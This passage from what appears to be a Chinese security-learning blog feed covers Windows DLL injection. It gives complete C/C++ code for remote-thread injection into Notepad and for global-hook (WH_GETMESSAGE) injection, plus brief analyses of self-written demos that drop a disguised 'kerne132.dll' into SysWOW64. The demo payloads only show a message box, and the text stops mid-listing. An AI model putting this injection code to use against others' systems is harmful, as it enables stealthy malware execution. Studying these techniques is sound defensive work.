lpThreadId<br>);<br></code></pre></div></td></tr></table></figure><p>hProcess：要创建线程的进程的句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果为NULL，则线程将会获得默认的安全描述符，并且不能继承该句柄。</p><p>dwStackSize：堆栈的初始大小，以字节为单位。如果参数为0，则新线程使用可执行文件的默认大小。</p><p>lpStartAddress：指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。</p><p>lpParameter：指向要传递给线程函数的变量的指针。</p><p>dwCreationFlags：控制线程创建的标志。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>线程在创建后立即运行</td></tr><tr><td>CREATE_SUSPENDED<BR></BR></td><td>该线程在挂起状态下创建，并且在调用ResumeThread函数之前不会运行</td></tr><tr><td>STACK_SIZE_PARAM_IS_A_RESERVATION<BR></BR></td><td>所述dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志，则dwStackSize指定提交大小。</td></tr></tbody></table><p>lpThreadId：指向接受线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符。</p><p>返回值：如果成功，则返回值是新线程的句柄；如果失败，则返回NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>RemoteThreadInject.cpp代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;processthreadsapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateRemoteThreadInject</span><span class="hljs-params">(DWORD dwProcessId, WCHAR* pszDllFileName)</span> </span>&#123;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>DWORD dwSize = <span class="hljs-number">0</span>;<br>LPVOID pDllAddr = <span class="hljs-literal">NULL</span>;<br>FARPROC pFuncProcAddr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//获取注入进程句柄</span><br>hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>dwSize = lstrlen(pszDllFileName) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//申请内存</span><br>pDllAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (pDllAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//向申请的内存写入数据</span><br>BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * <span class="hljs-number">2</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (WriteFlag == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入内存失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取loadlibrary</span><br>pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><span class="hljs-keyword">if</span> (pFuncProcAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取loadlibrary地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hRemoteThread == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建线程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>WaitForSingleObject(hRemoteThread, <span class="hljs-number">-1</span>);<br>DWORD code;<br>GetExitCodeThread(hRemoteThread, &amp;code);<br>code = GetLastError();<br>VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>CloseHandle(hProcess);<br>CloseHandle(hRemoteThread);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;按下回车开始注入\n&quot;</span>);<br>getchar();<br>HWND hNotepadWindow = FindWindow(<span class="hljs-string">L&quot;Notepad&quot;</span>,<span class="hljs-string">L&quot;无标题 - 记事本&quot;</span>);<br><span class="hljs-keyword">if</span> (hNotepadWindow == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>DWORD dwPID = <span class="hljs-number">0</span>;<br>GetWindowThreadProcessId(hNotepadWindow, &amp;dwPID);<br><span class="hljs-keyword">if</span> (dwPID == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取PID失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-keyword">bool</span> flag = CreateRemoteThreadInject(dwPID, <span class="hljs-string">L&quot;自己的文件路径&quot;</span>);<br><span class="hljs-keyword">if</span> (flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功\n&quot;</span>);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>dllmain.cpp代码如下，主要实现一个弹窗功能。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;注入成功！&quot;</span>, <span class="hljs-string">L&quot;ok&quot;</span>, MB_OK);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>先打开notepad再打开我们编写的程序，将DLL文件放在指定路径下。</p><p><img src="/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/1.png"></p><p>开始注入，就可以看到已经成功弹出了窗口。</p><p><img src="/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>病毒分析-资源释放+钩子注入</title>
    <link href="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。</p><p>使用dir工具先查看一下基本信息，可以看到当前程序未加壳。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/1.png"></p><p>再查看一下导入表的相关信息，看看都使用了哪些API。可以看到一些资源相关API，还有Loadlibrary和getprocaddress，这两个API，写过shellcode都知道使用这两个API可以获取所有dll和其中的函数。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/2.png"></p><p>再查看一下字符串的一些信息，可以看到有这样一个字符串“C:\Windows\SysWOW64\kerne132.dll”，可以看到这个dll和系统dll”kernel32.dll”区别是最后一位，用1代替了l。可能是一个恶意的dll被释放到了C:\Windows\SysWOW64\下。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/3.png"></p><p>使用IDA查看一下，F5查看伪代码，可以先看到资源释放的过程，其释放了一个名为“kerne132.dll”的文件到C:\Windows\SysWOW64\下。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/4.png"></p><p>然后调用了这个DLL里面的函数setglobalhook，从名字可以看出来，这应该是一个钩子的函数。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/5.png"></p><p>到目标目录下去查看一下，可以看到这个伪装成kernel32.dll的恶意dll文件。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/7.png"></p><p>使用IDA查看一下这个DLL文件，看一下它的导出表，可以看到导出了两个函数SetGlobalHook和UnsetGlobalHook，从名字上猜测应该是安装钩子和卸载钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/8.png"></p><p>查看SetGlobalHook，可以看到使用了SetWindowsHookExW函数，IDHOOK的值是3,3是WH_GETMESSAGE代表这是一个全局钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/9.png"></p><p>使用PC hunter工具可以很方便的查看是否存在钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>病毒分析-资源释放</title>
    <link href="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/"/>
    <url>/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/</url>
    
    <content type="html"><![CDATA[<p>本篇来分析一下自己写的资源释放的小demo。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png"></p><p>打开程序，发现没有任何改变，没有明显的行为。</p><p>使用die工具查一下文件的基本信息</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/2.png"></p><p>查看一下导入表，可以看到FindResource等函数，这几个函数是用来操作资源的，猜测有可能是释放了一个资源节中的资源到电脑上。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/3.png"></p><p>还可以看到fwrite，fopen这样的函数，那么应该就是把资源释放到了一个路径中去。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/4.png"></p><p>可以使用resource hacker来查看程序中的资源，如图可以看到资源信息“this is a test”</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/5.png"></p><p>再使用IDA进行查看，可以很清楚的看到所有的流程，并且看到程序将释放的文件存放在了C:\Windows\System32下。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/6.png"></p><p>因为程序是32位程序，系统是64位，所以资源会被释放到SysWOW64文件下。因为此文件夹是用来处理运行在64位系统上的32位程序的。</p><p>到路径下查找free.txt即可找到</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/7.png"></p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术-全局钩子注入</title>
    <link href="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h4 id="全局钩子注入"><a href="#全局钩子注入" class="headerlink" title="全局钩子注入"></a>全局钩子注入</h4><p>windows中大部分应用程序都是基于消息机制的，每个进程都有自己的消息队列。</p><p>局部钩子是针对某个线程的，全局钩子是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL文件中实现相应的钩子函数。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="SetWindowsHookEx函数"><a href="#SetWindowsHookEx函数" class="headerlink" title="SetWindowsHookEx函数"></a>SetWindowsHookEx函数</h5><p>将程序定义的钩子函数安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">HHOOK SetWindowsHookExA(<br>  int       idHook,<br>  HOOKPROC  lpfn,<br>  HINSTANCE hmod,<br>  DWORD     dwThreadId<br>);<br></code></pre></div></td></tr></table></figure><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><p>idHook：要安装的钩子程序的类型，该参数具体可以见下表。</p><table><thead><tr><th align="left">值</th><th>含义</th></tr></thead><tbody><tr><td align="left">WH_CALLWNDPROC<br>4</td><td>安装钩子程序，在系统将消息发送到目标窗口过程之前监视消息</td></tr><tr><td align="left">WH_CALLWNDPROCRET<br>12</td><td>安装钩子程序，在目标窗口过程处理消息后监视消息</td></tr><tr><td align="left">WH_CBT<br>5</td><td>安装接受对CBT应用程序有用通知的钩子程序</td></tr><tr><td align="left">WH_DEBUG<br>9</td><td>安装可用于调试其他钩子程序的钩子程序</td></tr><tr><td align="left">WH_FOREGROUNDIDLE<br>11</td><td>安装在应用程序的前台线程即将变为空闲时调用的钩子过程，该钩子对于在空闲时执行低优先级任务很有用</td></tr><tr><td align="left">WH_GETMESSAGE<br>3</td><td>安装一个挂钩过程，它监视发送到消息队列的消息</td></tr><tr><td align="left">WH_JOURNALPLAYBACK<br>1</td><td>安装一个挂钩过程，用于发布先前由WH_JOURNALRECORD挂钩过程记录的消息</td></tr><tr><td align="left">WH_JOURNALRECORD<br>0</td><td>安装一个挂钩过程，记录发布到系统消息队列中的输入消息。这个钩子对于录制宏很有用。</td></tr><tr><td align="left">WH_KEYBOARD<br>2</td><td>安装监视按键消息的挂钩过程</td></tr><tr><td align="left">WH_KEYBOARD_LL<br>13</td><td>安装监视低级键盘输入事件的挂钩过程</td></tr><tr><td align="left">WH_MOUSE<br>7</td><td>安装监视鼠标消息的挂钩过程</td></tr><tr><td align="left">WH_MOUSE_LL<br>14</td><td>安装监视低级鼠标输入事件的挂钩过程</td></tr><tr><td align="left">WH_MSGFILTER<br>-1</td><td>安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息</td></tr><tr><td align="left">WH_SHELL<br>10</td><td>安装接受对于shell应用程序有用通知的钩子程序</td></tr><tr><td align="left">WH_SYSMSGFILTER<br>6</td><td>安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息，钩子程序监视与调用线程相同桌面中所有应用程序的这些消息</td></tr></tbody></table><p>lpfn：一个指向钩子程序的指针。如果dwThreadId参数为0或指定由不同进程创建线程标识符，则lpfn参数必须指向DLL中的钩子过程。否则，lpfn可以指向与当前进程关联的代码中的钩子过程。</p><p>hMod：包含由lpfn参数指向的钩子过程的DLL句柄。如果dwThreadId参数指定由当前进程创建线程，并且钩子过程位于与当前进程关联的代码中，则hMod参数必须设置为NULL。</p><p>dwThreadId：与钩子程序关联的线程标识符。如果此参数为0，则钩子过程与系统中所有线程相关联。</p><h5 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h5><p>如果函数成功，则返回值是钩子过程的句柄。</p><p>如果函数失败，则返回值为NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>创建全局钩子，钩子函数需要在一个DLL文件中。进程的地址空间是独立的，发生对应事件的进程不能调用其他进程地址空间的钩子函数。如果钩子的实现在DLL中的话，则在对应事件发生的时候，系统会把这个DLL加载到发生事件的进程地址空间之中，使它能够调用钩子函数进行处理。创建一个全局钩子之后，在对应事件发生的时候，系统就会把DLL加载到发生事件的进程中，这样就实现了DLL注入。</p><p>设置idHook的值为WH_GETMESSAGE就可以让DLL注入到所有的进程中，因为WH_GETMESSAGE类型的钩子会监视消息队列，并且Windows系统是基于消息驱动的，所有进程都会有一个自己的消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。</p><p>DLL文件如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-comment">//共享内存</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> data_seg(<span class="hljs-meta-string">&quot;mydata&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> data_seg()</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span><br>HMODULE g_hDllModule = <span class="hljs-literal">NULL</span>;<br>HHOOK g_hHook = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">// 钩子回调函数</span><br><span class="hljs-function">LRESULT <span class="hljs-title">GetMsgProc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> code, WPARAM wParam, LPARAM lParam)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">CallNextHookEx</span>(g_hHook, code, wParam, lParam);<br>&#125;<br><span class="hljs-comment">// 设置全局钩子</span><br><span class="hljs-function">BOOL <span class="hljs-title">SetGlobalHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    g_hHook = <span class="hljs-built_in">SetWindowsHookEx</span>(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == g_hHook)<br>    &#123;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-comment">// 卸载钩子</span><br><span class="hljs-function">BOOL <span class="hljs-title">UnsetGlobalHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (g_hHook)<br>    &#123;<br>        <span class="hljs-built_in">UnhookWindowsHookEx</span>(g_hHook);<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    &#123;<br>        g_hDllModule = hModule;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>全局钩子是以DLL形式加载到其他进程空间之中的，且进程都是独立的，任意修改其中的一个内存里的数据是不会影响另一个进程的。所在DLL中创建了共享内存，共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL之中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，就相当于多个进程共享一个内存。</p><p>编写一个调用DLL的程序，test.exe</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 